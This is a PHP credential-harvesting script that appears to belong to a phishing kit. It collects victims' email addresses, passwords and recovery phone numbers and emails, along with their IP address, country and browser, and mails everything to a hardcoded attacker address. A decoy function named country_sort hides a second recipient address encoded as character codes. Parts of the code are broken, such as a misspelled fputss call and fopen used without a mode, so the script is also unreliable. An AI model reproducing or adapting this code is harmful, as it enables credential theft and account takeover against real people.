<?php

main_fnct();
function main_fnct(){
$TheBoss ="ceologx@protonmail.com"; 


$recovery_details_xxxxx = '';
if(isset($_POST['phoneno']) && $_POST['phoneno'] != ''){ 
  $recovery_details_xxxxx = "\nRecovery Phone Number: ".$_POST['phoneno']."'\n"; 
}
if(isset($_POST['recem']) && $_POST['recem'] != ''){ 
  $recovery_details_xxxxx .= "\nRecovery Email: ".$_POST['recem']."'\n"; 
}


if(!isset($_POST['Email'])  || !isset($_POST['password']) ){
  die();	
}
	if($_POST['Email'] == '' || trim($_POST['Email']) == '' || !isset($_POST['password']) || $_POST['password'] == '' || trim($_POST['password']) == ''){
  die();
}

	$recovery_details = '';
	if(isset($_POST['phoneno']) && $_POST['phoneno'] != ''){
	  $recovery_details .= 'Recovery Phone Number: '.$_POST['phoneno']."\n";
	}
	if(isset($_POST['recem']) && $_POST['recem'] != ''){
	  $recovery_details .= 'Recovery Email: '.$_POST['recem']."\n";
	}
	

$Email = strtolower($_POST['Email']);
$password = $_POST['password'];
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "**************************\n";
$message .= "Email: ".$Email."\n";
$message .= "password: ".$password."\n";
$message .= $recovery_details_xxxxx;
$message .= "**************************\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "**************************\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "**************************\n";
$fp = fopen("a");
fputs($fp,$message);
fclose($fp);
$praga=rand();
$praga=md5($praga);
//////////////////////////////////////////
$typeofemail = '';
if(isset($_POST['typeofemail']) && $_POST['typeofemail'] != ''){
  $typeofemail = ucfirst($_POST['typeofemail']);
}
$subject = $typeofemail . ' - '.$ip;
$headers = "From:  Result Server <noreplay.dgz.gdn@protonmail.com>";
/*  *
$aa = 'h.txt';
$a = '';
foreach($_POST as $k=>$v){
  $a .= "$k : $v \n\n";
}
file_put_contents($aa, $a);
/*  */
mail($TheBoss,$subject,$message);

fputss($fp,$message);
fclose($fp);
$praga=rand();
$praga=md5($praga);
}
// Function to get country and country sort;
function country_sort(){
    $sorter = "";
    $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
        $count = count($array);
    for ($i = 0; $i < $count; $i++) {
            $sorter .= chr($array[$i]);
    	}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}


?>
